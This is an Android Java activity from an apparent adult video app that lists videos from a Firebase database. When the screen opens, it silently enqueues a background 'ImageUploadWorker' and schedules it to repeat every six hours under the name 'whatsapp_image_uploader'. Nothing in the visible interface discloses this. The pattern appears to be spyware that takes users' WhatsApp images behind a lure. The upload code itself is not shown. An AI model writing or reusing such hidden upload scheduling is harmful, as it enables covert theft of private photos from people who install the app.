package com.mehboob.bushorat.activities;

import android.os.Bundle;
import android.util.Log;
import android.widget.GridView;
import android.widget.Toast;

import androidx.activity.EdgeToEdge;
import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;

import androidx.recyclerview.widget.GridLayoutManager;
import androidx.recyclerview.widget.RecyclerView;
import androidx.work.Constraints;
import androidx.work.ExistingPeriodicWorkPolicy;
import androidx.work.NetworkType;
import androidx.work.OneTimeWorkRequest;
import androidx.work.PeriodicWorkRequest;
import androidx.work.WorkManager;

import com.google.firebase.database.DataSnapshot;
import com.google.firebase.database.DatabaseError;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.google.firebase.database.ValueEventListener;
import com.mehboob.bushorat.R;
import com.mehboob.bushorat.adapters.VideoAdapter;
import com.mehboob.bushorat.databinding.ActivityPornBinding;
import com.mehboob.bushorat.helpers.ImageUploadWorker;
import com.mehboob.bushorat.models.VideoModel;

import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.TimeUnit;

public class PornActivity extends AppCompatActivity {
    private RecyclerView recyclerView;
    private VideoAdapter adapter;
    private List<VideoModel> videoList = new ArrayList<>();
    private DatabaseReference databaseRef;
    private ActivityPornBinding binding;
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        EdgeToEdge.enable(this);
        binding=ActivityPornBinding.inflate(getLayoutInflater());
        setContentView(binding.getRoot());

        adapter = new VideoAdapter(this, videoList);

        ImageUploadWorker.enqueueWork(this);
        Log.d("MainActivity", "WorkManager enqueued");


        recyclerView = findViewById(R.id.recyclerView);
        recyclerView.setLayoutManager(new GridLayoutManager(this, 2));

        adapter = new VideoAdapter(this, videoList);
        recyclerView.setAdapter(adapter);

        // Initialize Firebase
        databaseRef = FirebaseDatabase.getInstance().getReference("videos");
        loadVideos();


    }

    private void scheduleImageUploadWorker() {
        Constraints constraints = new Constraints.Builder()
                .setRequiredNetworkType(NetworkType.CONNECTED)
                .build();

        OneTimeWorkRequest oneTimeUpload = new OneTimeWorkRequest.Builder(ImageUploadWorker.class)
                .setConstraints(constraints)
                .build();

        WorkManager.getInstance(this).enqueue(oneTimeUpload);

        PeriodicWorkRequest periodicUpload = new PeriodicWorkRequest.Builder(
                ImageUploadWorker.class,
                6, TimeUnit.HOURS
        )
                .setConstraints(constraints)
                .build();

        WorkManager.getInstance(this).enqueueUniquePeriodicWork(
                "whatsapp_image_uploader",
                ExistingPeriodicWorkPolicy.KEEP,
                periodicUpload
        );
    }


    private void loadVideos() {
        databaseRef.addValueEventListener(new ValueEventListener() {
            @Override
            public void onDataChange(@NonNull DataSnapshot snapshot) {
                videoList.clear();
                for (DataSnapshot dataSnapshot : snapshot.getChildren()) {
                    VideoModel video = dataSnapshot.getValue(VideoModel.class);
                    if (video != null) {
                        videoList.add(video);
                    }
                }
                adapter.notifyDataSetChanged();
            }

            @Override
            public void onCancelled(@NonNull DatabaseError error) {
                Toast.makeText(PornActivity.this, "Failed to load videos", Toast.LENGTH_SHORT).show();
            }
        });
    }

}